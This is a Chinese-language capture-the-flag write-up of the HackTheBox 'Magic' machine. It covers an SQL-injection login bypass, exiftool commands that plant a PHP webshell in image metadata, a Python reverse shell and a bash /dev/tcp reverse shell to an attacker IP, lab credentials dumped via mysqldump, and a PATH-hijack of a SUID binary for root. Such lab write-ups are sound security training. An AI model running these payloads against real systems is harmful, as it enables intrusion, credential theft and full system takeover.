---
title: HackTheBox-Magic
date: 2025-4-3 20:00:00
tags: 红队
categories: 红队打靶-Linux
---





## nmap

![image-20250402171145487](./Magic/image-20250402171145487.png)

## dirsearch

![image-20250402171526168](./Magic/image-20250402171526168.png)

## 80端口

简单sql注入绕过登录

![image-20250402174635214](./Magic/image-20250402174635214.png)

文件只允许上传图片，尝试过后不是前端验证，并且直接传一句话木马也会被识别

![image-20250402174705761](./Magic/image-20250402174705761.png)

![image-20250402174820732](./Magic/image-20250402174820732.png)

将命令注入正常图片中，生成一个图片马

```shell
exiftool -Comment='<?php system($_REQUEST['cmd']); ?>' sample.png

exiftool poc.jpg -documentname="<?php echo exec(\$_REQUEST['cmd']); ?>"
```

生成的图片马可以成功上传，但是想要让php代码解析就不能以图片格式上传，中间件是apache，可能存在apache解析漏洞，

回到index.php可以看到刚才上传的图片，将文件名改为`shell.php.png`

![image-20250402180902847](./Magic/image-20250402180902847.png)

index.php下有图片，可以查看图片的路径，替换为自己上传的文件名即可访问

![image-20250402175104411](./Magic/image-20250402175104411.png)

可以命令执行

![image-20250403102239859](./Magic/image-20250403102239859.png)

反弹shell

```
10.10.10.185/images/uploads/x.php.png?cmd=python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.16.3",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

![image-20250403111432899](./Magic/image-20250403111432899.png)

```
theseus:iamkingtheseus
```

/etc/passwd中也存在用户，但是使用改密码ssh无法连接

该靶机不存在mysql，但是存在mysqldump， mysqldump是对数据库进行备份的一个工具，利用该账号对数据库进行备份，就可以看到数据库中的内容

```
mysqldump -A -u theseus -p  > all_database.sql
```

![image-20250403113338213](./Magic/image-20250403113338213.png)

```
admin:Th3s3usW4sK1ng
```

数据库中有admin账号密码，上面bd.php5中的username是`theseus`，这个密码应该就是theseus的密码,利用改密码成功切换到theseus用户

![image-20250403140649661](./Magic/image-20250403140649661.png)

## 提权

查看有suid权限的文件，其中有一个/bin/sysinfo，运行后会打印系统信息

![image-20250403142053598](./Magic/image-20250403142053598.png)

查看该进程调用的系统库，调用了fdisk这个文件，提权思路就是写一个反弹shell的fdisk让sysinfo来以root权限调用

![image-20250403142255249](./Magic/image-20250403142255249.png)

```shell
theseus@magic:/dev/shm$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.16.3/4444 0>&1' > fdisk

theseus@magic:/dev/shm$ chmod +x fdisk

theseus@magic:/dev/shm$ export PATH=$PATH:/dev/shm

theseus@magic:/dev/shm$ sysinfo
```

![image-20250403143522212](./Magic/image-20250403143522212.png)